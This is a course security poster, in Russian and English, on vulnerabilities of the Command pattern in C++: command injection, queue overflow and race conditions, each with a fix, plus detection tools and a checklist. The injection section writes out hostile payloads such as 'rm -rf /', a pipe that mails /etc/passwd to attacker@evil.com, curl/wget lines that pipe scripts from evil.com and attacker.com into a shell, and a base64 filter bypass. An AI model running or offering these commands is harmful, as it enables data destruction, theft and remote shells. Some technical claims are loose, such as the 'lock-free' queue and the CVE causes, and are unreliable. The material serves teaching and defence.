# 🛡️ Security Poster: Command Pattern

## 🎯 Обзор угроз Command Pattern

```
┌────────────────────────────────────────────────────────────────────┐
│              КРИТИЧЕСКИЕ УЯЗВИМОСТИ COMMAND PATTERN                │
└────────────────────────────────────────────────────────────────────┘

🔴 КРИТИЧНЫЕ УГРОЗЫ:
┌─────────────────────┬──────────────────────────────────────────────┐
│ Command Injection   │ CWE-77/78: OS command injection via system() │
│                     │ Impact: RCE, full system compromise          │
├─────────────────────┼──────────────────────────────────────────────┤
│ Queue Overflow      │ CWE-770: Unbounded command queue             │
│                     │ Impact: Memory exhaustion, DoS, OOM          │
├─────────────────────┼──────────────────────────────────────────────┤
│ Race Conditions     │ CWE-362: Concurrent queue access             │
│                     │ Impact: Command reordering, data corruption  │
└─────────────────────┴──────────────────────────────────────────────┘

🟡 ВЫСОКИЕ УГРОЗЫ:
┌─────────────────────┬──────────────────────────────────────────────┐
│ Command Replay      │ Replay attacks через undo/redo history       │
│ Privilege Escalation│ Commands executed with elevated privileges   │
│ Command Tampering   │ Modification of queued commands              │
└─────────────────────┴──────────────────────────────────────────────┘
```

## 💣 Критическая уязвимость #1: Command Injection

### Анатомия атаки

```cpp
// ❌ УЯЗВИМЫЙ КОД - Direct system() call без validation
class ShellCommand : public Command {
private:
    std::string command_;
    
public:
    ShellCommand(const std::string& cmd) : command_(cmd) {}
    
    void execute() override {
        system(command_.c_str());  // ⚠️ COMMAND INJECTION!
    }
};

// Использование:
std::string user_input = getUserInput();
Command* cmd = new ShellCommand(user_input);
cmd->execute();  // 💥 Executes ANY user input!
```

### 🎯 Exploitation: Shell metacharacters

```cpp
// ЭКСПЛОЙТ: Command injection payloads

// 1. Command chaining
ShellCommand("ls; rm -rf /");
// Выполняет: ls, ЗАТЕМ rm -rf /

// 2. Logical operators
ShellCommand("false || rm -rf /");
// Если false fails → выполняет rm -rf /

ShellCommand("true && cat /etc/passwd | mail attacker@evil.com");
// Если true succeeds → exfiltrates /etc/passwd

// 3. Command substitution
ShellCommand("echo $(whoami)");
ShellCommand("echo `cat /etc/shadow`");
// Выполняет вложенные команды

// 4. Redirection
ShellCommand("ls > /dev/null; wget http://evil.com/backdoor.sh | sh");
// Redirect + download and execute backdoor

// 5. Environment manipulation
ShellCommand("export PATH=/tmp:$PATH; malicious_ls");
// Подменяет PATH для hijacking

// 6. Escape sequences
ShellCommand("ls\n rm -rf /");
// Newline как separator
```

### Real-world exploitation scenario

```cpp
// Сценарий: Web application file viewer
void viewFile(const std::string& filename) {
    // Предполагаемое использование: "document.pdf"
    std::string cmd = "cat " + filename;
    ShellCommand viewer(cmd);
    viewer.execute();
}

// АТАКА:
viewFile("nonexistent.txt; rm -rf /var/www/html");
// Выполняется: cat nonexistent.txt; rm -rf /var/www/html
// Result: Website deleted!

viewFile("; curl http://attacker.com/reverse-shell.sh | bash");
// Result: Reverse shell established

viewFile("$(wget -O- http://attacker.com/exploit)");
// Result: Downloads and executes attacker's script

// Advanced: Bypassing filters
viewFile("l\"s");           // "ls" с quoted character
viewFile("l\\'s");          // Escaped quote
viewFile("$'\\x6c\\x73'");  // Hex encoded "ls"
viewFile("$(echo 'cm0gLXJmIC8=' | base64 -d | sh)");  // Base64: rm -rf /
```

### ✅ Защита: Whitelist + Parameterized execution

```cpp
// ✅ БЕЗОПАСНЫЙ КОД - Whitelist validation + execv
class SafeShellCommand {
private:
    std::string command_;
    std::vector<std::string> args_;
    
    // Whitelist разрешенных команд
    static const std::set<std::string> WHITELIST;
    
    bool validate() const {
        // 1. Проверка команды против whitelist
        if (WHITELIST.find(command_) == WHITELIST.end()) {
            throw SecurityException("Command not whitelisted: " + command_);
        }
        
        // 2. Валидация аргументов (no shell metacharacters)
        std::regex dangerous_chars(R"([;&|`$()<>\\'\"])");
        for (const auto& arg : args_) {
            if (std::regex_search(arg, dangerous_chars)) {
                throw SecurityException("Dangerous characters in argument");
            }
        }
        
        return true;
    }
    
public:
    void execute() override {
        validate();
        
        // ✅ Используем execv вместо system()
        // execv НЕ интерпретирует shell metacharacters
        
        pid_t pid = fork();
        if (pid == 0) {
            // Child process
            std::vector<char*> argv;
            argv.push_back(const_cast<char*>(command_.c_str()));
            for (auto& arg : args_) {
                argv.push_back(const_cast<char*>(arg.c_str()));
            }
            argv.push_back(nullptr);
            
            execv(command_.c_str(), argv.data());
            _exit(1);  // execv failed
        }
        
        // Parent waits for child
        int status;
        waitpid(pid, &status, 0);
    }
};

const std::set<std::string> SafeShellCommand::WHITELIST = {
    "/bin/ls",
    "/bin/pwd",
    "/bin/date",
    // Только SAFE команды
};

// Альтернатива: Вообще избегать shell commands
class FileViewCommand {
    std::filesystem::path file_;
    
    void execute() override {
        // ✅ Используем C++ API вместо shell
        if (!std::filesystem::exists(file_)) {
            throw std::runtime_error("File not found");
        }
        
        std::ifstream ifs(file_);
        std::cout << ifs.rdbuf();  // Safe file reading
    }
};
```

## 💣 Критическая уязвимость #2: Queue Overflow

### Анатомия атаки

```cpp
// ❌ УЯЗВИМЫЙ КОД - Unbounded command queue
class CommandQueue {
private:
    std::queue<std::unique_ptr<Command>> commands_;  // ⚠️ No limit!
    
public:
    void enqueue(std::unique_ptr<Command> cmd) {
        commands_.push(std::move(cmd));  // ⚠️ Unbounded growth
    }
    
    void execute() {
        while (!commands_.empty()) {
            auto cmd = std::move(commands_.front());
            commands_.pop();
            cmd->execute();
        }
    }
};
```

### 🎯 Exploitation: Memory exhaustion DoS

```cpp
// ЭКСПЛОЙТ: Queue overflow для OOM
void exploit_queue_overflow() {
    CommandQueue queue;
    
    // АТАКА: Flood queue with commands
    while (true) {
        // Создаем большие команды
        std::string large_data(1024 * 1024, 'A');  // 1MB each
        auto cmd = std::make_unique<DataCommand>(large_data);
        queue.enqueue(std::move(cmd));
        
        // Memory grows unbounded
        // After ~8GB (typical system):
        // → OOM killer terminates process
        // → Denial of Service
    }
}

// Более реалистичный сценарий: Slow consumer
void exploit_slow_consumer() {
    CommandQueue queue;
    
    // Thread 1: Fast producer (attacker)
    std::thread producer([&]() {
        while (true) {
            for (int i = 0; i < 10000; ++i) {
                queue.enqueue(std::make_unique<HeavyCommand>());
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    });
    
    // Thread 2: Slow consumer (legitimate)
    std::thread consumer([&]() {
        while (true) {
            queue.execute();  // Processes slowly
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    });
    
    // Result: Producer >> Consumer
    // Queue grows indefinitely → Memory exhaustion
}
```

### Queue growth visualization

```
┌──────────────────────────────────────────────────────────────────┐
│                    QUEUE OVERFLOW TIMELINE                       │
└──────────────────────────────────────────────────────────────────┘

Time    Producer Rate    Consumer Rate    Queue Size    Memory
────────────────────────────────────────────────────────────────────
T0      0 cmd/s           0 cmd/s          0            10 MB
T1      1000 cmd/s        100 cmd/s        900          50 MB
T2      1000 cmd/s        100 cmd/s        1800         100 MB
T5      1000 cmd/s        100 cmd/s        4500         250 MB
T10     1000 cmd/s        100 cmd/s        9000         500 MB
T30     1000 cmd/s        100 cmd/s        27000        1.5 GB
T100    1000 cmd/s        100 cmd/s        90000        5 GB
T200    1000 cmd/s        100 cmd/s        180000       10 GB
        💥 OOM KILLER TRIGGERED → Process terminated
```

### ✅ Защита: Bounded queue + backpressure

```cpp
// ✅ БЕЗОПАСНЫЙ КОД - Bounded queue с rejection policy
class BoundedCommandQueue {
private:
    std::queue<std::unique_ptr<Command>> commands_;
    std::mutex mutex_;
    std::condition_variable cv_;
    const size_t MAX_SIZE = 1000;  // ✅ Hard limit
    std::atomic<size_t> rejected_{0};
    
public:
    bool enqueue(std::unique_ptr<Command> cmd, 
                 std::chrono::milliseconds timeout = std::chrono::milliseconds(100)) {
        std::unique_lock lock(mutex_);
        
        // ✅ Wait with timeout если queue full
        if (!cv_.wait_for(lock, timeout, [this] { 
            return commands_.size() < MAX_SIZE; 
        })) {
            // Timeout → reject command
            rejected_++;
            return false;
        }
        
        commands_.push(std::move(cmd));
        cv_.notify_one();
        return true;
    }
    
    std::unique_ptr<Command> dequeue() {
        std::unique_lock lock(mutex_);
        
        cv_.wait(lock, [this] { return !commands_.empty(); });
        
        auto cmd = std::move(commands_.front());
        commands_.pop();
        
        cv_.notify_one();  // Notify producer
        return cmd;
    }
    
    // Metrics для monitoring
    size_t size() const {
        std::lock_guard lock(mutex_);
        return commands_.size();
    }
    
    size_t getRejectedCount() const {
        return rejected_;
    }
};

// Priority queue для важных команд
class PriorityCommandQueue {
    std::priority_queue<
        std::pair<int, std::unique_ptr<Command>>,
        std::vector<std::pair<int, std::unique_ptr<Command>>>,
        std::greater<>
    > commands_;
    
    const size_t MAX_SIZE = 1000;
    
    bool enqueue(std::unique_ptr<Command> cmd, int priority) {
        if (commands_.size() >= MAX_SIZE) {
            // Drop lowest priority command
            // (priority queue top = lowest)
            if (priority > commands_.top().first) {
                return false;  // New command even lower priority
            }
            commands_.pop();  // Remove lowest
        }
        
        commands_.emplace(priority, std::move(cmd));
        return true;
    }
};
```

## 💣 Критическая уязвимость #3: Race Conditions

### Анатомия атаки

```cpp
// ❌ УЯЗВИМЫЙ КОД - Non-thread-safe queue
class RacyCommandQueue {
private:
    std::queue<Command*> commands_;  // ⚠️ No synchronization
    
public:
    void enqueue(Command* cmd) {
        commands_.push(cmd);  // ⚠️ Data race!
    }
    
    Command* dequeue() {
        if (commands_.empty()) return nullptr;
        Command* cmd = commands_.front();  // ⚠️ Data race!
        commands_.pop();
        return cmd;
    }
};
```

### 🎯 Exploitation: Command reordering

```cpp
// ЭКСПЛОЙТ: Race condition для reordering
void exploit_command_race() {
    RacyCommandQueue queue;
    
    // Thread 1: Enqueue payment commands
    std::thread t1([&]() {
        queue.enqueue(new ValidatePayment());  // Should execute first
        queue.enqueue(new ProcessPayment());   // Should execute second
        queue.enqueue(new SendReceipt());      // Should execute third
    });
    
    // Thread 2: Concurrent enqueue
    std::thread t2([&]() {
        queue.enqueue(new MaliciousCommand());  // Injected between
    });
    
    // Race condition может привести к:
    // 1. ValidatePayment → MaliciousCommand → ProcessPayment
    //    💥 Payment processed without validation!
    //
    // 2. ProcessPayment → ValidatePayment → SendReceipt
    //    💥 Payment validated AFTER processing!
    //
    // 3. Double execution из-за iterator corruption
    //    💥 Payment charged twice!
}
```

### ✅ Защита: Thread-safe queue

```cpp
// ✅ БЕЗОПАСНЫЙ КОД - Lock-free thread-safe queue
template<typename T>
class LockFreeQueue {
private:
    struct Node {
        std::shared_ptr<T> data;
        std::atomic<Node*> next;
        Node() : next(nullptr) {}
    };
    
    std::atomic<Node*> head_;
    std::atomic<Node*> tail_;
    
public:
    void enqueue(T value) {
        auto new_data = std::make_shared<T>(std::move(value));
        Node* new_node = new Node();
        
        Node* old_tail = tail_.load();
        old_tail->data.swap(new_data);
        old_tail->next.store(new_node);
        tail_.store(new_node);
    }
    
    std::shared_ptr<T> dequeue() {
        Node* old_head = head_.load();
        if (old_head == tail_.load()) {
            return nullptr;  // Empty
        }
        
        head_.store(old_head->next);
        return old_head->data;
    }
};

// Альтернатива: Mutex-based thread-safe queue (simpler)
class MutexCommandQueue {
    std::queue<std::unique_ptr<Command>> commands_;
    mutable std::mutex mutex_;
    std::condition_variable cv_;
    
    void enqueue(std::unique_ptr<Command> cmd) {
        {
            std::lock_guard lock(mutex_);
            commands_.push(std::move(cmd));
        }
        cv_.notify_one();
    }
    
    std::unique_ptr<Command> dequeue() {
        std::unique_lock lock(mutex_);
        cv_.wait(lock, [this] { return !commands_.empty(); });
        
        auto cmd = std::move(commands_.front());
        commands_.pop();
        return cmd;
    }
};
```

## 🛠️ Инструменты детектирования

### 1. Static Analysis - Command Injection Detection

```bash
# Clang Static Analyzer с taint checking
clang++ --analyze \
    -Xanalyzer -analyzer-checker=alpha.security.taint.TaintPropagation \
    command_vulnerabilities.cpp

# Semgrep для command injection patterns
semgrep --config="r/cpp.lang.security.insecure-system-call" \
    command_vulnerabilities.cpp

# Вывод:
# command.cpp:45: error: Potential command injection
#     system(user_input.c_str());
#     ^
```

### 2. ThreadSanitizer - Race Detection

```bash
g++ -fsanitize=thread -O1 -g command_vulnerabilities.cpp -o command_tsan

./command_tsan
```

**Типичный вывод TSan**:
```
WARNING: ThreadSanitizer: data race (pid=12345)
  Write of size 8 at 0x7b0400000020 by thread T2:
    #0 std::queue::push command.cpp:34
    #1 CommandQueue::enqueue command.cpp:35
    
  Previous read of size 8 at 0x7b0400000020 by thread T1:
    #0 std::queue::front command.cpp:45
    #1 CommandQueue::dequeue command.cpp:46
```

### 3. Runtime Monitoring - strace

```bash
# Мониторинг system calls
strace -f -e trace=execve,fork,clone ./command_app 2>&1 | tee trace.log

# Анализ вывода:
grep "execve" trace.log

# Suspicious patterns:
# execve("/bin/sh", ["/bin/sh", "-c", "rm -rf /"], ...) ← ALERT!
# execve("/bin/bash", [..., "wget", "http://evil.com"], ...) ← ALERT!
```

### 4. Memory Monitoring - Valgrind Massif

```bash
# Мониторинг memory growth (queue overflow)
valgrind --tool=massif \
         --massif-out-file=massif.out \
         ./command_app

ms_print massif.out

# Вывод показывает heap growth:
# 0.00^                                                                       #
#      |                                                                       #
#      |                                                                   @@@@#
#      |                                                               @@@@@@@@#
#      |                                                           @@@@@@@@@@@@#
# MB   |                                                       @@@@@@@@@@@@@@@@#
#      |                                                   @@@@@@@@@@@@@@@@@@@@#
#      |                                               @@@@@@@@@@@@@@@@@@@@@@@@#
#      |                                           @@@@@@@@@@@@@@@@@@@@@@@@@@@@#
#      |                                       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
# 
# ← Exponential growth указывает на queue overflow
```

## 📋 Security Checklist для Command Pattern

### Design Phase
```
[ ] Определен whitelist допустимых команд
[ ] Документирована execution model (sync/async)
[ ] Определен queue size limit
[ ] Рассмотрены scenarios для command injection
[ ] Threat model для privilege escalation
[ ] Audit logging спроектирован
```

### Implementation Phase
```
[ ] Нет прямого system() или exec() с user input
[ ] Whitelist validation перед execution
[ ] Parameterized execution (execv, не system)
[ ] Bounded queue с rejection policy
[ ] Thread-safe queue operations
[ ] Command authentication/authorization
[ ] Input sanitization (escape shell metacharacters)
```

### Testing Phase
```
[ ] Command injection tests (shell metacharacters)
[ ] Queue overflow tests (load testing)
[ ] Race condition tests с ThreadSanitizer
[ ] Privilege escalation tests
[ ] Fuzzing с malformed commands
[ ] Replay attack tests
```

### Deployment Phase
```
[ ] Command execution logging (audit trail)
[ ] Monitoring queue size (alerting на overflow)
[ ] Rate limiting для command submission
[ ] Sandboxing для command execution
[ ] Resource limits (ulimit, cgroups)
```

## 🎓 Best Practices

### 1. Command Sanitization

```cpp
// ✅ Escape shell metacharacters
std::string sanitize_shell_arg(const std::string& input) {
    std::string result;
    result.reserve(input.size() * 2);
    
    for (char c : input) {
        switch (c) {
            case '\\': case '\'': case '"': case '$':
            case '`': case '!': case '&': case '|':
            case ';': case '<': case '>': case '(':
            case ')': case '{': case '}': case '[':
            case ']': case '*': case '?': case '~':
            case ' ': case '\t': case '\n':
                result += '\\';
                result += c;
                break;
            default:
                result += c;
        }
    }
    
    return result;
}
```

### 2. Command Authentication

```cpp
// ✅ Signed commands
class SignedCommand {
    std::unique_ptr<Command> command_;
    std::vector<uint8_t> signature_;
    
    bool verify(const PublicKey& key) const {
        auto serialized = serialize(command_);
        return crypto_verify_signature(serialized, signature_, key);
    }
    
    void execute() override {
        if (!verify(trusted_public_key)) {
            throw SecurityException("Command signature invalid");
        }
        command_->execute();
    }
};
```

### 3. Sandboxed Execution

```cpp
// ✅ Execute commands в sandbox
class SandboxedCommand {
    void execute() override {
        // Linux: seccomp-bpf filter
        scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
        
        // Allow only safe syscalls
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
        
        // Block dangerous syscalls (execve, open, socket, etc.)
        seccomp_load(ctx);
        
        // Execute command with restricted syscalls
        doExecute();
    }
};
```

## 🚨 CVE Examples - Real-World Impact

```
┌────────────────────────────────────────────────────────────────┐
│            ИЗВЕСТНЫЕ CVE С COMMAND PATTERN VULNERABILITIES     │
└────────────────────────────────────────────────────────────────┘

CVE-2021-44228 (Log4Shell)
├─ Тип: Remote Code Execution через JNDI injection
├─ CVSS: 10.0 (CRITICAL)
├─ Impact: Complete system compromise
└─ Причина: Unvalidated command execution в logging

CVE-2014-6271 (Shellshock)
├─ Тип: Remote Code Execution через bash environment
├─ CVSS: 10.0 (CRITICAL)
├─ Impact: RCE через HTTP requests
└─ Причина: Command injection в bash function parsing

CVE-2019-0708 (BlueKeep)
├─ Тип: Pre-auth RCE в RDP protocol
├─ CVSS: 9.8 (CRITICAL)
├─ Impact: Wormable RCE
└─ Причина: Command deserialization без validation

CVE-2020-1938 (Ghostcat - Apache Tomcat)
├─ Тип: Arbitrary file read/inclusion → RCE
├─ CVSS: 9.8 (CRITICAL)
├─ Impact: Read sensitive files, RCE
└─ Причина: AJP protocol command injection
```

## 📚 Дополнительные ресурсы

### Стандарты
- **CWE-77**: Improper Neutralization of Special Elements used in a Command
- **CWE-78**: OS Command Injection
- **CWE-770**: Allocation of Resources Without Limits
- **CWE-362**: Concurrent Execution using Shared Resource
- **OWASP A03:2021**: Injection

### Инструменты
- Semgrep: https://semgrep.dev/
- Shellcheck: https://www.shellcheck.net/
- Seccomp: https://www.kernel.org/doc/html/latest/userspace-api/seccomp_filter.html
- strace: https://strace.io/

### Книги
- "The Tangled Web" - Michal Zalewski (Command injection)
- "The Web Application Hacker's Handbook" - Dafydd Stuttard
- "The Art of Software Security Assessment" - Dowd, McDonald, Schuh

## 💡 Золотое правило Command Security

```
┌────────────────────────────────────────────────────────────────┐
│                                                                │
│  "Каждая команда - это potential shell escape.                │
│   НИКОГДА не передавайте user input в system() или exec().    │
│   Используйте whitelist, parameterization, и sandboxing."      │
│                                                                │
│  Если вы видите system(user_input) - это критическая          │
│  уязвимость. Полная остановка. Refactor немедленно.            │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

---

**Версия**: 1.0  
**Дата**: 2025-10-11  
**Курс**: Patterns (Security Integration Track)  
**Лицензия**: MIT

